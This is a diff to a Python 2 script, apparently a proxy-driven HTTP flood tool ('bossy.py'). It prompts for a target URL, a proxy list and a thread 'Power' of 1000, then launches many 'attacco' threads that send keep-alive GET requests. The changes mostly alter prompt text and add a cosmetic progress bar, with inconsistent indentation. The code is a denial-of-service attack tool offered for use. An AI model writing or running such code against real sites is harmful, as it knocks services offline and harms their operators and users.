@@ -304,11 +304,7 @@ class attacco(threading.Thread):
  
  
 #Main
-	print ''
-	print ''
-        print 'Sample'
-        print 'python bossy.py http://www.examples.com/'
-	print "\a"
+
 print \
 """                                                                                                                                          
   ____   ___  ____ ______   __
@@ -321,17 +317,17 @@ print \
 print ''
  
 # Site
-url = raw_input("Target Sites http://www.examples.com/ : ")
+url = raw_input("Target Sites ( http://www.examples.com/ ) : ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
  
 #Proxy
-in_file = open(raw_input("Add Proxy proxy.txt : "),"r")
+in_file = open(raw_input("Add Proxy ( proxy.txt ) : "),"r")
 proxyf = in_file.read()
 in_file.close()
  
 listaproxy = proxyf.split('\n')
 #So luong
-thread = input("Power 1000 : ") 
+thread = input("Power ( 1000 ) : ") 
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
@@ -341,9 +337,20 @@ x = 0
 for x in xrange(thread):
     attacco().start()
     time.sleep(0.003)
+	print "[                    ] 0% "
+        time.sleep(5)
+        print "[=====               ] 25%"
+        time.sleep(5)
+        print "[==========          ] 50%"
+        time.sleep(5)
+        print "[===============     ] 75%"
+        time.sleep(5)
+        print "[====================] 100%"
+        time.sleep(3)
+        sent = 0
 print "Program Started :)"
 print "To Stop The Program CTRL + Z :)"
-print "Good Luck"
+print "Good Luck :)"
 nload = 0
 while not nload:
     time.sleep(1)
